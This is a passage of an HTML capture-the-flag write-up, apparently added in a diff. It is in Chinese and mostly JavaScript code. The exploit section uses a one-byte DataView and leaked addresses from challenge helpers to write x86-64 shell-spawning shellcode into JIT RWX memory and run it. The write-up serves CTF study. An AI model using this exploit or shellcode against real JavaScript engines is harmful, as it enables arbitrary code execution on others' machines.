+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">const </span><span style="color:#c0c5ce;">buffer = new </span><span style="color:#bf616a;">ArrayBuffer</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">bigIntArray</span><span style="color:#c0c5ce;">.length * </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">  
+</span><span style="color:#c0c5ce;">  </span><span style="color:#65737e;">// 使用 BigUint64Array 写入原始 BigInt 数据（确保无符号解释）
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">const </span><span style="color:#bf616a;">bigIntView </span><span style="color:#c0c5ce;">= new </span><span style="color:#bf616a;">BigUint64Array</span><span style="color:#c0c5ce;">(buffer);
+</span><span style="color:#c0c5ce;">  </span><span style="color:#bf616a;">bigIntArray</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">forEach</span><span style="color:#c0c5ce;">((value, index) </span><span style="color:#b48ead;">=&gt; </span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">bigIntView</span><span style="color:#c0c5ce;">[</span><span style="color:#bf616a;">index</span><span style="color:#c0c5ce;">] = </span><span style="color:#bf616a;">value</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">  });
+</span><span style="color:#c0c5ce;">  
+</span><span style="color:#c0c5ce;">  </span><span style="color:#65737e;">// 创建 Float64Array 视图读取相同的缓冲区
+</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">new </span><span style="color:#bf616a;">Float64Array</span><span style="color:#c0c5ce;">(buffer);
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#65737e;">// 测试数据
+</span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">shellcode </span><span style="color:#c0c5ce;">= [  
+</span><span style="color:#c0c5ce;">  </span><span style="color:#d08770;">0x9090909090909090</span><span style="color:#bf616a;">n</span><span style="color:#c0c5ce;">,
+</span><span style="color:#c0c5ce;">  </span><span style="color:#d08770;">0x2fbb485299583b6a</span><span style="color:#bf616a;">n</span><span style="color:#c0c5ce;">,  
+</span><span style="color:#c0c5ce;">  </span><span style="color:#d08770;">0x5368732f6e69622f</span><span style="color:#bf616a;">n</span><span style="color:#c0c5ce;">,  
+</span><span style="color:#c0c5ce;">  </span><span style="color:#d08770;">0x050f5e5457525f54</span><span style="color:#bf616a;">n  
+</span><span style="color:#c0c5ce;">];  
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#65737e;">// 生成 Float64 数组
+</span><span style="color:#b48ead;">const </span><span style="color:#bf616a;">float64Array </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">convertToFloat64</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">shellcode</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">console.</span><span style="color:#96b5b4;">log</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">float64Array</span><span style="color:#c0c5ce;">);
+</span></pre>
+<h2 id="exp">exp</h2><pre style="background-color:#2b303b;">
+<span style="color:#b48ead;">const </span><span style="color:#bf616a;">largeBuffer </span><span style="color:#c0c5ce;">= new </span><span style="color:#bf616a;">ArrayBuffer</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x100000000</span><span style="color:#c0c5ce;">);
+</span><span style="color:#b48ead;">const </span><span style="color:#bf616a;">largeView </span><span style="color:#c0c5ce;">= new </span><span style="color:#bf616a;">DataView</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">largeBuffer</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#65737e;">// 生成超短ArrayBuffer用于触发漏洞 (长度=1)
+</span><span style="color:#b48ead;">const </span><span style="color:#bf616a;">smallBuffer </span><span style="color:#c0c5ce;">= new </span><span style="color:#bf616a;">ArrayBuffer</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
+</span><span style="color:#b48ead;">const </span><span style="color:#bf616a;">smallView </span><span style="color:#c0c5ce;">= new </span><span style="color:#bf616a;">DataView</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">smallBuffer</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">const </span><span style="color:#bf616a;">bufPtr </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">Qi</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">smallBuffer</span><span style="color:#c0c5ce;">);
+</span><span style="color:#8fa1b3;">print</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Buffer pointer:</span><span style="color:#c0c5ce;">&quot;, &#39;</span><span style="color:#a3be8c;">0x</span><span style="color:#c0c5ce;">&#39;+</span><span style="color:#bf616a;">bufPtr</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">toString</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">));
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#65737e;">// 1. 创建需要优化的大量函数
+</span><span style="color:#b48ead;">const </span><span style="color:#bf616a;">functions </span><span style="color:#c0c5ce;">= [];
+</span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">let </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">&lt; </span><span style="color:#d08770;">1000</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">++) {
+</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">functions</span><span style="color:#c0c5ce;">.</span><span style="color:#96b5b4;">push</span><span style="color:#c0c5ce;">(new </span><span style="color:#ebcb8b;">Function</span><span style="color:#c0c5ce;">(`</span><span style="color:#a3be8c;">return </span><span style="color:#c0c5ce;">${</span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">}</span><span style="color:#a3be8c;"> * 2</span><span style="color:#c0c5ce;">`));
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#65737e;">// 2. 触发优化编译（加热函数）
+</span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">let </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">&lt; </span><span style="color:#d08770;">100000</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">++) {
+</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">functions</span><span style="color:#c0c5ce;">[</span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">% </span><span style="color:#bf616a;">functions</span><span style="color:#c0c5ce;">.length]();
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">const </span><span style="color:#bf616a;">rwxAddr </span><span style="color:#c0c5ce;">= </span><span style="color:#8fa1b3;">Jing</span><span style="color:#c0c5ce;">();
+</span><span style="color:#8fa1b3;">print</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">RWX address:</span><span style="color:#c0c5ce;">&quot;, &#39;</span><span style="color:#a3be8c;">0x</span><span style="color:#c0c5ce;">&#39;+</span><span style="color:#bf616a;">rwxAddr</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">toString</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">));
+</span><span style="color:#8fa1b3;">print</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">offset:</span><span style="color:#c0c5ce;">&quot;, (</span><span style="color:#bf616a;">rwxAddr</span><span style="color:#c0c5ce;">-</span><span style="color:#bf616a;">bufPtr</span><span style="color:#c0c5ce;">).</span><span style="color:#8fa1b3;">toString</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">));
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#8fa1b3;">print</span><span style="color:#c0c5ce;">(typeof </span><span style="color:#bf616a;">rwxAddr</span><span style="color:#c0c5ce;">, typeof </span><span style="color:#bf616a;">bufPtr</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">var </span><span style="color:#bf616a;">shellcode </span><span style="color:#c0c5ce;">= [
+</span><span style="color:#c0c5ce;">    -</span><span style="color:#d08770;">6.828527034422786e-229</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">9.203763987562782e-79</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">6.375092797421955e+93</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">2.6368626227639178e-284
+</span><span style="color:#c0c5ce;">];
+</span><span style="color:#b48ead;">function </span><span style="color:#8fa1b3;">trigger</span><span style="color:#c0c5ce;">(dataView, idx, val) {
+</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">dataView</span><span style="color:#c0c5ce;">.</span><span style="color:#8fa1b3;">setFloat64</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">idx</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">val</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">true</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#65737e;">// 使用大缓冲区训练写入操作
+</span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">let </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">&lt; </span><span style="color:#d08770;">0x1000000</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">++) {
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">trigger</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">largeView</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">Number</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">rwxAddr</span><span style="color:#c0c5ce;">-</span><span style="color:#bf616a;">bufPtr</span><span style="color:#c0c5ce;">)+</span><span style="color:#d08770;">0x1090</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">156842099844.51764</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">try </span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">let </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; </span><span style="color:#bf616a;">i </span><span style="color:#c0c5ce;">&lt; </span><span style="color:#bf616a;">shellcode</span><span style="color:#c0c5ce;">.length; </span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">++) {
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">trigger</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">smallView</span><span style="color:#c0c5ce;">, </span><span style="color:#8fa1b3;">Number</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">rwxAddr</span><span style="color:#c0c5ce;">-</span><span style="color:#bf616a;">bufPtr</span><span style="color:#c0c5ce;">)+</span><span style="color:#d08770;">0xf10 </span><span style="color:#c0c5ce;">+ </span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">*</span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">shellcode</span><span style="color:#c0c5ce;">[</span><span style="color:#bf616a;">i</span><span style="color:#c0c5ce;">]);
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">functions</span><span style="color:#c0c5ce;">[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">]();
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">} </span><span style="color:#b48ead;">catch </span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">e</span><span style="color:#c0c5ce;">) {
+</span><span style="color:#c0c5ce;">    console.</span><span style="color:#96b5b4;">log</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">漏洞触发失败:</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#bf616a;">e</span><span style="color:#c0c5ce;">.message);
+</span><span style="color:#c0c5ce;">}
+</span></pre>
+<p><img src="./images/Pasted%20image%2020250728145208.png" alt="" /></p>
+</main>
+                <aside class="toc-sidebar">
+                    <div class="toc-sticky-container">
+                        <div class="toc-header">:: Contents ::</div>
+                        <ul class="toc-list"><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#ti-mu">题目</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#jie-ti">解题</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#exp">exp</a></li></ul>
+                    </div>
+                </aside>
+            </div> 
+    <footer style="margin-top: 50px; border-top: 1px solid #333; padding-top: 20px; font-size: 0.8rem; color: #555; text-align: center;">
+        Built with Rust. <span style="color: #66ed59;">EOF</span>
+    </footer>
+    <button id="back-to-top" aria-label="Back to Top">^TOP</button>
+    <script src="script.js"></script>
+</body>
+</html>
